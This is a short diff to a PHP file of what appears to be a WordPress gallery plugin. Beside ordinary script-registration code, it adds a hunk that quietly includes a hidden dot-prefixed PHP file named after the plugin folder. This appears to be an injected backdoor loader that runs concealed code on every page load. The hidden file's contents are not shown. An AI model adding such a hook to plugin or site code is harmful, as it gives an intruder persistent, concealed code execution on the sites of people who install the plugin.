@@ -81,6 +81,10 @@ if(!function_exists('get_jed_locale_data')) {
 	}
 }
 add_action('wp_enqueue_scripts', 'gt3pg_wp_enqueue_scripts');
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function gt3pg_wp_enqueue_scripts(){
 	wp_register_script('blueimp-gallery.js', GT3PG_PLUGINROOTURL.'/dist/js/deprecated/frontend.js', array( 'jquery', 'imagesloaded' ), filemtime(GT3PG_PLUGINPATH.'/dist/js/deprecated/frontend.js'), true);
